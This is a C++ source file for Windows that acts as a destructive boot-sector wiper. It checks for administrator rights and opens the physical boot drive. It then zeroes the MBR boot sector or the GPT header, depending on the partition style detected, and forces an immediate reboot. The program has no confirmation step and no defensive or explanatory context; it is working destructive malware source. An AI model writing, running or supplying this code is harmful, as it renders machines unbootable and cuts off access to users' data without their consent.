#include <Windows.h>
#include <ioapiset.h>
#include <iomanip>
#include <iostream>
#include <vector>
#include <string>

enum class PartitionStyle
{
	Mbr,
	Gpt
};

struct PartitionEntry
{
	DWORD partitionNumber;
	ULONGLONG startingOffset;
	ULONGLONG size;
	GUID partitionType;
	GUID partitionId;
};

static HANDLE hBootDrive = nullptr;

std::wstring FormatErrorMessage(const DWORD errorCode = GetLastError())
{
	LPWSTR buffer = nullptr;
	const DWORD result = FormatMessageW(
		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		nullptr,
		errorCode,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		reinterpret_cast<LPWSTR>(&buffer),
		0,
		nullptr
	);

	std::wstring errorMessage;
	if (result != 0)
	{
		errorMessage = buffer;
		LocalFree(buffer);
	}
	else
	{
		errorMessage = L"Unknown error";
	}

	return errorMessage;
}

bool GetPhysicalDriveFromDriveLetter(const std::wstring& driveLetter, std::wstring& physicalDrive)
{
	DWORD bytesReturned;
	STORAGE_DEVICE_NUMBER storageDeviceNumber;

	const HANDLE hVolume = CreateFileW(driveLetter.c_str(), 0, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
		OPEN_EXISTING, FILE_FLAG_NO_BUFFERING, nullptr);
	if (hVolume == INVALID_HANDLE_VALUE)
	{
		std::wcout << L"Failed to open volume " << driveLetter << L". Error: " << FormatErrorMessage() << std::endl;
		return false;
	}

	if (!DeviceIoControl(hVolume, IOCTL_STORAGE_GET_DEVICE_NUMBER, nullptr, 0, &storageDeviceNumber,
		sizeof storageDeviceNumber, &bytesReturned, nullptr))
	{
		std::wcout << L"Failed to retrieve device number for volume " << driveLetter << L". Error: " <<
			FormatErrorMessage() << std::endl;
		CloseHandle(hVolume);
		return false;
	}

	CloseHandle(hVolume);

	physicalDrive = L"\\\\.\\PhysicalDrive" + std::to_wstring(storageDeviceNumber.DeviceNumber);

	return true;
}

bool GetLBASectorSize(DWORD& sectorSize)
{
	DWORD bytesReturned;
	DISK_GEOMETRY_EX diskGeometry;

	if (!DeviceIoControl(hBootDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &diskGeometry,
		sizeof diskGeometry, &bytesReturned, nullptr))
	{
		std::wcout << L"Failed to retrieve drive geometry. Error: " << FormatErrorMessage() << std::endl;
		return false;
	}

	sectorSize = diskGeometry.Geometry.BytesPerSector;

	return true;
}

bool OpenBootDrive()
{
	std::wstring bootDrive;
	if (!GetPhysicalDriveFromDriveLetter(L"\\\\.\\C:", bootDrive))
	{
		return false;
	}

	// Open the boot drive
	hBootDrive = CreateFileW(bootDrive.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH, nullptr);
	if (hBootDrive == INVALID_HANDLE_VALUE)
	{
		std::wcout << L"Failed to open the boot drive. Error: " << FormatErrorMessage() << std::endl;
		return false;
	}

	return true;
}

bool GetBootDriveType(PartitionStyle& style)
{
	// Get the partition style of the boot drive
	DWORD bytesReturned = 0;
	PARTITION_INFORMATION_EX partitionInfo;
	if (!DeviceIoControl(hBootDrive, IOCTL_DISK_GET_PARTITION_INFO_EX, nullptr, 0, &partitionInfo,
		sizeof partitionInfo, &bytesReturned, nullptr))
	{
		std::wcout << L"Failed to retrieve the partition style. Error: " << FormatErrorMessage() << std::endl;
		CloseHandle(hBootDrive);
		return false;
	}

	// Check if the partition style indicates GPT
	const bool isGPT = partitionInfo.PartitionStyle == PARTITION_STYLE_GPT;

	style = isGPT ? PartitionStyle::Gpt : PartitionStyle::Mbr;
	return true;
}

BOOL IsElevated()
{
	BOOL fRet = FALSE;
	HANDLE hToken = nullptr;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		TOKEN_ELEVATION elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof elevation, &cbSize))
		{
			fRet = elevation.TokenIsElevated > 0;
		}
	}
	if (hToken)
	{
		CloseHandle(hToken);
	}
	return fRet;
}

bool DestroyMBR()
{
	constexpr unsigned char buffer[512] = { 0 };

	DWORD bytesWritten = 0;
	if (!(WriteFile(hBootDrive, buffer, 512, &bytesWritten, nullptr) && bytesWritten == 512))
	{
		std::wcout << L"Failed to write to boot sector. Error: " << FormatErrorMessage() << std::endl;
		return false;
	}

	return true;
}

bool DestroyGPT()
{
	DWORD sectorSize;
	if (!GetLBASectorSize(sectorSize))
	{
		return false;
	}

	const auto buffer = new unsigned char[sectorSize * 2] {0};

	DWORD bytesWritten = 0;
	if (!(WriteFile(hBootDrive, buffer, sectorSize * 2, &bytesWritten, nullptr) && bytesWritten == sectorSize * 2))
	{
		std::wcout << L"Failed to write to GPT header. Error: " << FormatErrorMessage() << std::endl;
		delete[] buffer;
		return false;
	}

	delete[] buffer;
	return true;
}

int Finalize(const int code, const bool key = true)
{
	if (hBootDrive != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hBootDrive);
	}

	if (key)
	{
		std::wcout << L"Press any key to exit.";
		std::wcin >> std::ws;
	}

	return code;
}

bool Reboot()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	// Get a token for this process. 

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		std::wcout << L"Failed to open process token. Error: " << FormatErrorMessage() << std::endl;
		return false;
	}

	// Get the LUID for the shutdown privilege. 
	LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME,
		&tkp.Privileges[0].Luid);

	tkp.PrivilegeCount = 1;  // one privilege to set    
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Get the shutdown privilege for this process. 
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,
		nullptr, nullptr))
	{
		std::wcout << L"Failed to adjust token privileges. Error: " << FormatErrorMessage() << std::endl;
		return false;
	}

	// Shut down the system and force all applications to close. 
	if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE,
		SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_OTHER))
	{
		std::wcout << L"Failed to reboot. Error: " << FormatErrorMessage() << std::endl;
		return false;
	}

	//shutdown was successful
	return true;
}

int wmain(const int argc, const wchar_t* argv[])
{
	const std::vector<std::wstring> args(argv + 1, argv + argc);
	if (!IsElevated())
	{
		std::wcout << L"Run as administrator." << std::endl;
		return Finalize(1);
	}

	if (!OpenBootDrive())
	{
		return Finalize(2);
	}

	PartitionStyle style;
	if (!GetBootDriveType(style))
	{
		return Finalize(3);
	}

	bool (*func)();
	if (style == PartitionStyle::Gpt)
	{
		std::wcout << L"Detected GPT, destroying..." << std::endl;
		func = DestroyGPT;
	}
	else
	{
		std::wcout << L"Detected MBR, destroying..." << std::endl;
		func = DestroyMBR;
	}

	if (!func())
	{
		return Finalize(4);
	}
	
	std::wcout << L"Done." << std::endl;
	Finalize(0);
	if (!Reboot())
	{
		return Finalize(5, false);
	}

	return 0;
}
